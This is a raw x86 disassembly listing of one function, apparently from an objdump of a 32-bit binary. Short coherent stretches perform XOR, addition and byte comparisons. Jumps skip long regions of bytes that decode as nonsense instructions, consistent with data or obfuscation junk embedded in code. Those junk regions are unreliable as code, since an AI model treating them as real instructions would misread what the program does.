  403a00:	mov    eax,DWORD PTR [ebp-0x8]
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0x310afc5c
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a6b
  403a5b:	dec    ebx
  403a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a5d:	and    ebx,DWORD PTR [ebx+0x6d9f7742]
  403a63:	arpl   WORD PTR [ebx],sp
  403a65:	dec    eax
  403a66:	js     0x403a37
  403a68:	mov    al,ds:0x9046d14e
  403a6d:	mov    ecx,0x75f7e6d9
  403a72:	(bad)  
  403a73:	pushf  
  403a74:	add    edi,DWORD PTR [esi]
  403a76:	inc    esp
  403a77:	aam    0x66
  403a79:	scas   eax,DWORD PTR es:[edi]
  403a7a:	jp     0x403a33
  403a7c:	lea    ebx,[edi-0x3d16a508]
  403a82:	push   esi
  403a83:	(bad)  
  403a84:	add    DWORD PTR [esi],esi
  403a86:	jmp    0x4867:0x88fc1614
  403a8d:	pop    ss
  403a8e:	sbb    DWORD PTR [ecx+0x6d10a6d0],edx
  403a94:	and    eax,0xcf58a1de
  403a99:	dec    ebx
  403a9a:	pop    ebp
  403a9b:	jo     0x403ae5
  403a9d:	ss call 0x304f:0x3c748f53
  403aa5:	ret    
  403aa6:	inc    ebx
  403aa7:	fs jmp 0x89a6:0xe5419c9a
  403aaf:	adc    esp,DWORD PTR [esi]
  403ab1:	iret   
  403ab2:	pop    edi
  403ab3:	jno    0x403a3b
  403ab5:	push   edx
  403ab6:	mov    ebp,0x39ae5ec3
  403abb:	push   es
  403abc:	jb     0x403aaa
  403abe:	jae    0x403a84
  403ac0:	pop    ss
  403ac1:	daa    
  403ac2:	push   ebp
  403ac3:	mov    al,BYTE PTR [eax-0x2ca4b2b2]
  403ac9:	xor    DWORD PTR [eax],esi
  403acb:	xchg   ebx,eax
  403acc:	aaa    
  403acd:	or     al,0x96
  403acf:	sbb    dl,BYTE PTR [edx+0x5adfb493]
  403ad5:	mov    ecx,DWORD PTR [esi]
  403ad7:	cmp    eax,edx
  403ad9:	inc    ebx
  403ada:	mov    eax,ds:0x5905f4d8
  403adf:	add    BYTE PTR [ebx],dl
  403ae1:	out    0xca,al
  403ae3:	sub    eax,esp
  403ae5:	popf   
  403ae6:	ror    ah,cl
  403ae8:	and    bh,al
  403aea:	mov    ds:0x6beb8ab3,al
  403aef:	cli    
  403af0:	inc    BYTE PTR [edx-0x75ef72b1]
  403af6:	sbb    BYTE PTR [esp+esi*4+0x27],dh
  403afa:	icebp  
  403afb:	mov    dl,0xd8
  403afd:	bound  ecx,QWORD PTR [edi]
  403aff:	adc    DWORD PTR [eax+0xfabe796],0xf1fa133f
  403b09:	jmp    0xc9c49a7f
  403b0e:	jo     0x403ac9
  403b10:	loope  0x403b8f
  403b12:	ror    BYTE PTR [esi+0x15d8fe3d],1
  403b18:	rcr    DWORD PTR ds:0xd4128d68,1
  403b1e:	pop    esp
  403b1f:	sbb    eax,0x516f454c
  403b24:	push   edx
  403b25:	bound  edx,QWORD PTR [ecx]
  403b27:	pop    edx
  403b28:	mov    WORD PTR [ecx+0x51],ds
  403b2b:	(bad)  
  403b2c:	pop    ebx
  403b2d:	repnz neg bh
  403b30:	cs pusha 
  403b32:	jb     0x403b46
  403b34:	mov    dl,0x36
  403b36:	push   cs
  403b37:	sub    esi,DWORD PTR ds:0xd44a5c97
  403b3d:	adc    BYTE PTR [edx+0xf777f82],al
  403b43:	xchg   ebp,eax
  403b44:	dec    ecx
  403b45:	fcmovnbe st,st(7)
  403b47:	mov    eax,DWORD PTR [esi+0x3c]
  403b4a:	xchg   esi,eax
  403b4b:	jae    0x403b90
  403b4d:	sub    eax,0xcb34dd53
  403b52:	rol    ch,cl
  403b54:	push   ss
  403b55:	cmp    eax,0x50312721
  403b5a:	push   es
  403b5b:	xchg   BYTE PTR [ecx],ch
  403b5d:	out    0x9b,al
  403b5f:	sub    al,0x8f
  403b61:	je     0x403b7b
  403b63:	data16 loopne 0x403aff
  403b66:	lea    ebx,[ebp-0x16]
  403b69:	push   esp
  403b6a:	sar    BYTE PTR [eax+0x73],cl
  403b6d:	xchg   ebx,eax
  403b6e:	paddq  mm4,QWORD PTR [ebx-0x2f]
  403b72:	ror    DWORD PTR [edi],0x22
  403b75:	inc    eax
  403b76:	adc    al,0x33
  403b78:	dec    esi
  403b79:	outs   dx,BYTE PTR ds:[esi]
  403b7a:	into   
  403b7b:	loope  0x403b1b
  403b7d:	test   BYTE PTR [ecx],al
  403b7f:	fdivp  st(4),st
  403b81:	sub    BYTE PTR [ebp-0x7b],dl
  403b84:	mov    cl,0xc9
  403b86:	xchg   ebx,eax
  403b87:	in     eax,0xe1
  403b89:	out    0xbb,eax
  403b8b:	cdq    
  403b8c:	(bad)  
  403b8d:	push   ebp
  403b8e:	fld    TBYTE PTR [edx+0x1b]
  403b91:	fisubr WORD PTR [esi+ebx*2]
  403b94:	addr16 leave 
  403b96:	add    eax,0x6f397844
  403b9b:	push   ebx
  403b9c:	add    al,0xa0
  403b9e:	mov    bh,0xe9
  403ba0:	jae    0x403b3d
  403ba2:	out    0x1a,al
  403ba4:	push   eax
  403ba5:	jmp    0x7b63:0x1842dce1
  403bac:	xor    al,0xaa
  403bae:	clc    
  403baf:	add    edx,DWORD PTR [ebp-0x71071c95]
  403bb5:	mov    edx,DWORD PTR [ebx-0x75]
  403bb8:	ja     0x403b43
  403bba:	nop
  403bbb:	(bad)  
  403bbc:	(bad)  
  403bbd:	(bad)  [ecx+0x22]
  403bc0:	enter  0x6db9,0x5c
  403bc4:	and    BYTE PTR [eax+0x3f],al
  403bc7:	or     eax,DWORD PTR [esi+edx*1]
  403bca:	mov    ?,WORD PTR [esi]
  403bcc:	ficomp DWORD PTR [edx]
  403bce:	loopne 0x403b85
  403bd0:	out    0xf1,eax
  403bd2:	enter  0x1a6e,0xf5
  403bd6:	rol    DWORD PTR [esi+0x34dbae2b],cl
  403bdc:	call   0x492d4dab
  403be1:	cwde   
  403be2:	pop    DWORD PTR [esi+0x2944c373]
  403be8:	inc    esp
  403be9:	(bad)  
  403bea:	mov    bl,0x5
  403bec:	cmp    esi,DWORD PTR [edi+0x4bd29866]
  403bf2:	les    ebx,FWORD PTR [ebx]
  403bf4:	out    dx,al
  403bf5:	lahf   
  403bf6:	ins    DWORD PTR es:[edi],dx
  403bf7:	mov    ch,0x15
  403bf9:	adc    ah,BYTE PTR [bx+di-0xe]
  403bfd:	scas   eax,DWORD PTR es:[edi]
  403bfe:	mov    dl,0xbe
  403c00:	mov    DWORD PTR [eax-0x4d2c39ac],esi
  403c06:	cmc    
  403c07:	lods   al,BYTE PTR ds:[esi]
  403c08:	int    0xf0
  403c0a:	je     0x4041a7
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x67dcf48b
  403c29:	outs   dx,BYTE PTR ds:[esi]
  403c2a:	adc    BYTE PTR [edx+eax*2-0x518181e2],cl
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c4e
  403c35:	ins    BYTE PTR es:[edi],dx
  403c36:	jnp    0x403cb6
  403c38:	push   ebp
  403c39:	push   ebp
  403c3a:	push   es
  403c3b:	mov    ecx,0xfa49d684
  403c40:	cmpxchg DWORD PTR [esi],ebx
  403c43:	shr    ebp,0xe
  403c46:	mov    ecx,0x6a57627d
  403c4b:	jg     0x403bfe
  403c4d:	or     ecx,edx
  403c4f:	rol    DWORD PTR [ecx],1
  403c51:	xor    eax,0xfe7ae27b
  403c56:	in     eax,0xaf
  403c58:	push   eax
  403c59:	sbb    BYTE PTR ds:0x3a8f1c5d,al
  403c5f:	add    ch,ch
  403c61:	fcom   QWORD PTR [edx-0x329d1cae]
  403c67:	cmp    eax,0xb6c2010e
  403c6c:	lock icebp 
  403c6e:	mov    ds:0xd82d58d7,al
  403c73:	or     al,0xb0
  403c75:	pop    edi
  403c76:	out    0xe9,eax
  403c78:	jns    0x403ccf
  403c7a:	cmp    al,0x1a
  403c7c:	xor    al,0x74
  403c7e:	stos   DWORD PTR es:[edi],eax
  403c7f:	dec    esp
  403c80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c81:	test   DWORD PTR [edx-0x22],ebx
  403c84:	jg     0x403cd3
  403c86:	xchg   edi,eax
  403c87:	jp     0x403cd0
  403c89:	shl    DWORD PTR [esi],0x43
  403c8c:	mov    dh,0xaf
  403c8e:	mov    al,ds:0x413b00c
  403c93:	popf   
  403c94:	push   esi
  403c95:	add    al,0xbb
  403c97:	test   BYTE PTR [eax+eiz*4+0x312eecba],dh
  403c9e:	icebp  
  403c9f:	xchg   esi,eax
  403ca0:	cmp    al,0x68
  403ca2:	iret   
  403ca3:	adc    BYTE PTR [edi+0x40efeece],0xe0
  403caa:	fdivr  QWORD PTR ds:0x383c0abd
  403cb0:	pop    ss
  403cb1:	pop    ss
  403cb2:	jge    0x403cec
  403cb4:	dec    esp
  403cb5:	jne    0x403ce3
  403cb7:	pop    edi
  403cb8:	int3   
  403cb9:	out    0x1b,al
  403cbb:	mov    cl,0x8b
  403cbd:	or     BYTE PTR [edi-0x41],bl
  403cc0:	add    BYTE PTR [eax],ah
  403cc2:	dec    ebx
  403cc3:	add    eax,0xda2a021b
  403cc8:	mov    dh,ah
  403cca:	cmp    eax,0x69db32c
  403ccf:	sbb    edi,DWORD PTR [edi]
  403cd1:	out    dx,al
  403cd2:	cld    
  403cd3:	mov    cl,0x5a
  403cd5:	mov    ds:0x2a3da192,eax
  403cda:	sub    BYTE PTR [esi+0x1bdee647],ch
  403ce0:	das    
  403ce1:	jge    0x403c8b
  403ce3:	je     0x403ce5
  403ce5:	ret    0x9e20
  403ce8:	repz cmc 
  403cea:	add    al,0xca
  403cec:	jp     0x403cfb
  403cee:	xor    BYTE PTR [edx+0x2f],bh
  403cf1:	mov    esi,0x62260627
  403cf6:	and    DWORD PTR [ebp-0xb],esi
  403cf9:	pop    esp
  403cfa:	fnsave [edi+0x3a]
  403cfd:	jns    0x403cc8
  403cff:	(bad)  
  403d00:	push   edi
  403d01:	mov    ds:0xa1110431,al
  403d06:	jns    0x403d62
  403d08:	mov    bh,0xa8
  403d0a:	addr16 and ch,bl
  403d0d:	ins    BYTE PTR es:[edi],dx
  403d0e:	cmp    ecx,ebx
  403d10:	mov    edi,gs
  403d12:	add    DWORD PTR [esi],ecx
  403d14:	and    eax,0xf83d1270
  403d19:	out    0x85,al
  403d1b:	dec    edx
  403d1c:	or     eax,ebx
  403d1e:	rol    DWORD PTR [esi-0x4a],1
  403d21:	xlat   BYTE PTR ds:[ebx]
  403d22:	aam    0xe3
  403d24:	jmp    0x403d12
  403d26:	fwait
  403d27:	sbb    eax,0x46295414
  403d2c:	add    BYTE PTR [esi],ah
  403d2e:	inc    edi
  403d2f:	xchg   edi,eax
  403d30:	mov    dh,0x53
  403d32:	loop   0x403d1a
  403d34:	jae    0x403d78
  403d36:	sbb    cl,cl
  403d38:	js     0x403cd0
  403d3a:	xchg   edx,eax
  403d3b:	push   edx
  403d3c:	fs aaa 
  403d3e:	int    0x40
  403d40:	loope  0x403d94
  403d42:	ss xchg edx,eax
  403d44:	mov    ebx,ebx
  403d46:	stc    
  403d47:	push   ss
  403d48:	imul   ebp,DWORD PTR [edi+0x67e45e8a],0x56
  403d4f:	imul   ebx,ebp,0xf783c6cd
  403d55:	aas    
  403d56:	push   es
  403d57:	push   edx
  403d58:	sti    
  403d59:	icebp  
  403d5a:	outs   dx,DWORD PTR ds:[esi]
  403d5b:	sbb    al,0x5a
  403d5d:	js     0x403d03
  403d5f:	idiv   al
  403d61:	scas   al,BYTE PTR es:[edi]
  403d62:	xchg   edx,eax
  403d63:	mov    esp,0x2b342518
  403d68:	cmc    
  403d69:	sar    BYTE PTR ds:0x31c0138e,cl
  403d6f:	loopne 0x403d35
  403d71:	mov    BYTE PTR [edi-0x42edf30a],ch
  403d77:	pop    eax
  403d78:	sbb    al,0x1f
  403d7a:	mov    ch,BYTE PTR [ebp+edi*8-0x1e]
  403d7e:	mov    ch,0x21
  403d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d81:	int3   
  403d82:	jbe    0x403dad
  403d84:	loop   0x403dd4
  403d86:	out    0xd2,al
  403d88:	lock add al,0xcb
  403d8b:	prefetch (bad)
  403d8c:	or     eax,0x9ad942ec
  403d91:	ror    al,cl
  403d93:	outs   dx,BYTE PTR ds:[esi]
  403d94:	or     BYTE PTR [edi+0x75],ah
  403d97:	push   0xe9c37839
  403d9c:	xchg   DWORD PTR [ebx+0x52],ebx
  403d9f:	pop    edi
  403da0:	cmp    DWORD PTR [ebx-0x2aa3a0a5],eax
  403da6:	pop    edx
  403da7:	out    0xee,eax
  403da9:	sbb    DWORD PTR [ecx+0x59],0xdc0a03d4
  403db0:	stc    
  403db1:	xchg   ecx,eax
  403db2:	lods   al,BYTE PTR ds:[esi]
  403db3:	dec    esi
  403db4:	stc    
  403db5:	dec    ecx
  403db6:	sbb    dl,dh
  403db8:	mov    ah,0x47
  403dba:	mov    bl,0x62
  403dbc:	out    0x3a,al
  403dbe:	popf   
  403dbf:	pop    esp
  403dc0:	iret   
  403dc1:	sub    ebx,ebx
  403dc3:	shl    DWORD PTR [ecx+0x619d9cdb],cl
  403dc9:	ror    BYTE PTR [esi],1
  403dcb:	and    eax,DWORD PTR [ecx]
  403dcd:	xchg   esi,eax
  403dce:	(bad)  
  403dcf:	mov    ah,BYTE PTR [esi+0x740644cf]
  403dd5:	dec    ebx
  403dd6:	test   eax,0x7f9cc21
  403ddb:	and    al,dh
  403ddd:	adc    BYTE PTR [ebx+0x1de31425],ch
  403de3:	mov    ebx,0x89e8458d
  403de8:	inc    ebp
  403de9:	in     al,dx
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi-0x4ed561dd],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403e90
  403e11:	jb     0x403e04
  403e13:	lds    esi,FWORD PTR cs:[ebp-0x2748bfae]
  403e1a:	and    bh,bl
  403e1c:	cmp    al,BYTE PTR [ebx+0x6bda6553]
  403e22:	out    dx,eax
  403e23:	pop    edx
  403e24:	add    cl,BYTE PTR [ecx-0x166e8f12]
  403e2a:	fisttp WORD PTR [ecx]
  403e2c:	sbb    edx,DWORD PTR [ebx]
  403e2e:	(bad)  
  403e2f:	call   0xba52:0x1e551506
  403e36:	jp     0x403de0
  403e38:	mov    dh,0xce
  403e3a:	rdmsr  
  403e3c:	push   ebx
  403e3d:	mov    edi,0xafbd0fa1
  403e42:	leave  
  403e43:	xchg   esp,eax
  403e44:	cs and eax,0xa6cd2429
  403e4a:	jno    0x403ea9
  403e4c:	xor    DWORD PTR [ecx-0x48a91118],0x29
  403e53:	arpl   WORD PTR [edx-0x2e74fe8],di
  403e59:	mov    dl,cl
  403e5b:	stos   BYTE PTR es:[edi],al
  403e5c:	xchg   esp,eax
  403e5d:	stos   DWORD PTR es:[edi],eax
  403e5e:	add    eax,0x14ccd52d
  403e63:	enter  0x2492,0xed
  403e67:	call   0x7349950b
  403e6c:	cmp    DWORD PTR [edi+0x47],edi
  403e6f:	pop    ebx
  403e70:	test   eax,0x81500d7d
  403e75:	xor    dl,BYTE PTR [esi+0x11abce5d]
  403e7b:	popf   
  403e7c:	or     eax,0x4a2a6ff4
  403e81:	cdq    
  403e82:	bound  esi,QWORD PTR [esi+0x7dea1992]
  403e88:	xchg   esp,eax
  403e89:	popf   
  403e8a:	sbb    al,0x39
  403e8c:	pop    ebp
  403e8d:	push   edi
  403e8e:	mov    eax,ds:0xb48f475c
  403e93:	retf   
  403e94:	ror    DWORD PTR [edi+eax*1+0x7175f88d],0xcc
  403e9c:	aad    0x8b
  403e9e:	mov    eax,ss
  403ea0:	push   0x9b3246f
  403ea5:	adc    BYTE PTR [ebx+ecx*4-0x4b],dh
  403ea9:	pusha  
  403eaa:	dec    esp
  403eab:	or     DWORD PTR [edi],edi
  403ead:	(bad)  
  403eae:	es cld 
  403eb0:	aad    0x90
  403eb2:	xor    dh,al
  403eb4:	add    edi,DWORD PTR [edx+eiz*1-0x68]
  403eb8:	mov    eax,0x5b8f3423
  403ebd:	fisubr WORD PTR [edi+ebx*8+0x61dc4d8c]
  403ec4:	mov    ecx,0xe086543c
  403ec9:	push   0x4e
  403ecb:	push   ss
  403ecc:	outs   dx,BYTE PTR ds:[esi]
  403ecd:	cmp    BYTE PTR [eax],0x32
  403ed0:	fld    DWORD PTR [edx+0x428b6491]
  403ed6:	shl    DWORD PTR [eax+0x788bbe05],cl
  403edc:	jne    0x403f33
  403ede:	int    0xa
  403ee0:	dec    esp
  403ee1:	pop    ebx
  403ee2:	jnp    0x403e9f
  403ee4:	jo     0x403f60
  403ee6:	mov    eax,0x6ce6e338
  403eeb:	out    dx,al
  403eec:	loop   0x403ea8
  403eee:	mov    DWORD PTR [ecx-0x142fe6c2],edi
  403ef4:	mov    ecx,0xec4fc28e
  403ef9:	inc    ebx
  403efa:	sbb    al,0xbe
  403efc:	push   edx
  403efd:	inc    ebp
  403efe:	jp     0x403f15
  403f00:	mov    dh,0x62
  403f02:	jns    0x403ed0
  403f04:	hlt    
  403f05:	lds    ebp,FWORD PTR [esi-0x10935ad0]
  403f0b:	sub    al,0xb4
  403f0d:	adc    eax,0x2c76b935
  403f12:	pop    edx
  403f13:	xor    BYTE PTR [esi+edx*1-0xd],al
  403f17:	sub    dl,BYTE PTR [edi+0x53]
  403f1a:	adc    BYTE PTR [eax],al
  403f1c:	ret    
  403f1d:	mov    ebx,0xb31dc9ee
  403f22:	call   0xe6fa38e9
  403f27:	(bad)  
  403f28:	inc    esp
  403f29:	and    al,0x5d
  403f2b:	mov    edx,0x6dfb462
  403f30:	call   0xfcdb:0x62596bf6
  403f37:	scas   al,BYTE PTR es:[edi]
  403f38:	scas   eax,DWORD PTR es:[edi]
  403f39:	jecxz  0x403ee0
  403f3b:	push   edx
  403f3c:	add    BYTE PTR [ecx-0x149717a],al
  403f42:	ret    0x345b
  403f45:	mov    eax,0x6990902f
  403f4a:	adc    BYTE PTR ds:0xa3c5629e,dl
  403f50:	inc    edx
  403f51:	push   ebx
  403f52:	jecxz  0x403f83
  403f54:	(bad)  
  403f55:	sbb    edx,DWORD PTR [ecx+0x243bca39]
  403f5b:	out    dx,eax
  403f5c:	sbb    ch,bh
  403f5e:	dec    ebp
  403f5f:	int    0xb7
  403f61:	mov    WORD PTR ds:0x31a34be7,es
  403f67:	adc    BYTE PTR [esi+ebx*8],bl
  403f6a:	cmp    BYTE PTR [ebp+0x69],dl
  403f6d:	xchg   ebp,eax
  403f6e:	pop    ss
  403f6f:	shl    DWORD PTR [ebp-0x7c],1
  403f72:	shl    DWORD PTR [esi-0x18],0xd4
  403f76:	jnp    0x403fee
  403f78:	aad    0x23
  403f7a:	in     al,0x9d
  403f7c:	dec    ebp
  403f7d:	fcom   DWORD PTR [eax-0x63]
  403f80:	xchg   esp,eax
  403f81:	push   esp
  403f82:	gs out 0x66,eax
  403f85:	inc    esp
  403f86:	cmp    eax,0x8843dd91
  403f8b:	fldenv [ebx+0x16]
  403f8e:	pop    edx
  403f8f:	pop    es
  403f90:	pop    ebx
  403f91:	fabs   
  403f93:	sbb    al,0x6
  403f95:	imul   esi,DWORD PTR [esi-0x10],0x3113f729
  403f9c:	xchg   esp,eax
  403f9d:	call   0x7a9e1d41
  403fa2:	or     ch,BYTE PTR [eax]
  403fa4:	push   es
  403fa5:	xor    al,0xcf
  403fa7:	xor    ebx,0xf
  403faa:	xor    ebx,eax
  403fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fad:	arpl   WORD PTR [ecx+0x3f],sp
  403fb0:	iret   
  403fb1:	cmc    
  403fb2:	into   
  403fb3:	xor    BYTE PTR [ecx],dl
  403fb5:	add    edx,DWORD PTR [ecx+0x5d]
  403fb8:	mov    ecx,0x627955f4
  403fbd:	adc    BYTE PTR [edx-0xfba740f],bh
  403fc3:	mov    edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	aad    0x42
  403fdb:	and    edx,0x7e7e1a22
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x403f8f
  403fe6:	push   ss
  403fe7:	jo     0x403ff6
  403fe9:	das    
  403fea:	aam    0x6e
  403fec:	out    0x1d,eax
  403fee:	repz inc esi
  403ff0:	and    dl,BYTE PTR [ecx+0x54]
  403ff3:	add    eax,0x19f85bbe
  403ff8:	dec    eax
  403ff9:	dec    esi
  403ffa:	sub    al,ch
  403ffc:	and    dl,ah
  403ffe:	pusha  
  403fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404001:	sbb    eax,0xc123e706
  404006:	adc    eax,0x1a1988a3
  40400b:	push   ebp
  40400c:	shl    esp,cl
  40400e:	jle    0x404027
  404010:	cmp    al,BYTE PTR [ebp+0x15]
  404013:	(bad)  
  404014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404015:	imul   esi,DWORD PTR [eax+0x35],0xfe12e03d
  40401c:	cdq    
  40401d:	jle    0x403fc7
  40401f:	pusha  
  404020:	call   0xec255d61
  404025:	mov    al,ds:0x209e9196
  40402a:	fwait
  40402b:	xchg   edi,eax
  40402c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40402d:	and    al,0x1d
  40402f:	int3   
  404030:	lock inc eax
  404032:	inc    esi
  404033:	jmp    FWORD PTR [ebx]
  404035:	out    dx,eax
  404036:	dec    esp
  404037:	out    dx,al
  404038:	jb     0x4040b4
  40403a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40403b:	and    esp,edx
  40403d:	push   edi
  40403e:	inc    esp
  40403f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404040:	ins    DWORD PTR es:[edi],dx
  404041:	mov    ah,0x5f
  404044:	lea    eax,[ecx-0x7e310c43]
  40404a:	xchg   ebp,eax
  40404b:	test   al,0x83
  40404d:	stos   DWORD PTR es:[edi],eax
  40404e:	mov    bl,0xb6
  404050:	ret    0xfd96
  404053:	mov    bl,0x9e
  404055:	pop    esp
  404056:	xor    eax,0x970edda2
  40405b:	bswap  eax
  40405d:	ja     0x403fe4
  40405f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404060:	cmp    DWORD PTR [esi-0x57],esi
  404063:	and    bl,dl
  404065:	ret    0x5124
  404068:	daa    
  404069:	and    BYTE PTR [edx],ch
  40406b:	push   ebx
  40406c:	xlat   BYTE PTR ds:[ebx]
  40406d:	jp     0x404034
  40406f:	push   eax
  404070:	mov    ebx,0xbcaad439
  404075:	(bad)  [edi-0x74]
  404078:	and    edi,DWORD PTR [ecx-0x55f2f3e]
  40407e:	mov    bl,0x63
  404080:	je     0x404048
  404082:	cmp    DWORD PTR [edi+0x6c],ebx
  404085:	(bad)  
  404086:	cli    
  404087:	js     0x40403e
  404089:	lea    edi,[ebp-0x544b23b1]
  40408f:	xor    BYTE PTR [eax-0x666d443f],dh
  404095:	test   al,0x8a
  404097:	jmp    0x40406e
  404099:	call   0x29d1c59c
  40409e:	push   es
  40409f:	out    0x4a,eax
  4040a1:	push   ss
  4040a2:	add    BYTE PTR [ebx+eax*1-0x5544a9e2],cl
  4040a9:	jo     0x40409b
  4040ab:	inc    BYTE PTR [eax]
  4040ad:	mov    edx,esp
  4040af:	sub    BYTE PTR [edi+esi*2],dh
  4040b2:	add    al,0x16
  4040b4:	out    0xba,eax
  4040b6:	mov    dh,0x86
  4040b8:	test   BYTE PTR [ecx+0xc],dl
  4040bb:	adc    bl,BYTE PTR [edi-0x3e]
  4040be:	dec    esi
  4040bf:	loopne 0x40404b
  4040c1:	jmp    0x1d06811e
  4040c6:	inc    eax
  4040c7:	pop    eax
  4040c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040c9:	add    cl,ah
  4040cb:	outs   dx,BYTE PTR ds:[esi]
  4040cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040cd:	or     DWORD PTR [ecx],esi
  4040cf:	test   BYTE PTR ds:0xbc63b15,bh
  4040d5:	dec    edi
  4040d6:	mov    BYTE PTR [edi-0x3a],dl
  4040d9:	sar    DWORD PTR [eax-0x46],0xdb
  4040dd:	jo     0x4040f8
  4040df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040e0:	xor    BYTE PTR [edx+0x7938a185],al
  4040e6:	dec    ecx
  4040e7:	pop    esi
  4040e8:	jns    0x404113
  4040ea:	stc    
  4040eb:	pop    ebp
  4040ec:	or     ebp,eax
  4040ee:	adc    eax,0xdea6b7c3
  4040f3:	in     al,dx
  4040f4:	out    dx,al
  4040f5:	dec    ecx
  4040f6:	call   0x5814:0x5b76f795
  4040fd:	pushf  
  4040fe:	or     BYTE PTR [esi+0x2c56e713],bl
  404104:	cli    
  404105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404106:	icebp  
  404107:	(bad)  
  404108:	push   ds
  404109:	(bad)  
  40410a:	mov    esi,esi
  40410c:	data16 cmp al,0x4
  40410f:	out    dx,al
  404110:	stos   DWORD PTR es:[edi],eax
  404111:	mov    edi,0xc20abb60
  404116:	add    al,0xc
  404118:	lock push eax
  40411a:	pop    es
  40411b:	dec    edx
  40411c:	clc    
  40411d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40411e:	mov    eax,0x92a8be45
  404123:	mov    ebx,0xadcfb9c3
  404128:	inc    ebp
  404129:	arpl   WORD PTR [esi-0xd767006],bx
  40412f:	dec    edx
  404130:	dec    ecx
  404131:	push   ebx
  404132:	pop    eax
  404133:	mov    al,dl
  404135:	into   
  404136:	xchg   ebx,eax
  404137:	and    ch,bl
  404139:	jmp    0x631c829d
  40413e:	cmp    BYTE PTR [ebx+esi*4+0x25],cl
  404142:	ins    BYTE PTR es:[edi],dx
  404143:	mov    dl,0xeb
  404145:	(bad)  
  404146:	sbb    BYTE PTR [eax],dl
  404148:	push   edi
  404149:	repnz cli 
  40414b:	repz sar BYTE PTR [ebp-0xce88d95],1
  404152:	lock push es
  404154:	jns    0x404103
  404156:	call   0x63c8:0x9a1b4c32
  40415d:	shl    DWORD PTR [edi],0xa6
  404160:	adc    DWORD PTR [eax],edx
  404162:	jno    0x4041bf
  404164:	loopne 0x4041be
  404166:	enter  0x955f,0x36
  40416a:	jg     0x40417d
  40416c:	cwde   
  40416d:	sbb    al,0xa4
  40416f:	and    al,ah
  404171:	or     eax,0x707c899e
  404176:	mov    al,ds:0xa13bfd8d
  40417b:	adc    ebx,DWORD PTR [ebp-0x72]
  40417e:	cmp    ecx,DWORD PTR [ecx+eiz*8+0x20e418b]
  404185:	mov    DWORD PTR [ebx],ebp
  404187:	loop   0x4041c5
  404189:	jge    0x4041ae
  40418b:	and    al,0x1d
  40418d:	pushf  
  40418e:	cld    
  40418f:	dec    ebx
  404190:	jae    0x40420a
  404192:	leave  
  404193:	sbb    ah,BYTE PTR [edx]
  404195:	lea    eax,[eax+edx*1+0x32729b]
  40419c:	mov    DWORD PTR [ebp+0x8],eax
  40419f:	inc    DWORD PTR [ebp+0xc]
  4041a2:	jmp    0x403a0a
  4041a7:	mov    eax,DWORD PTR [ebp-0x10]
  4041aa:	xor    eax,ecx
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
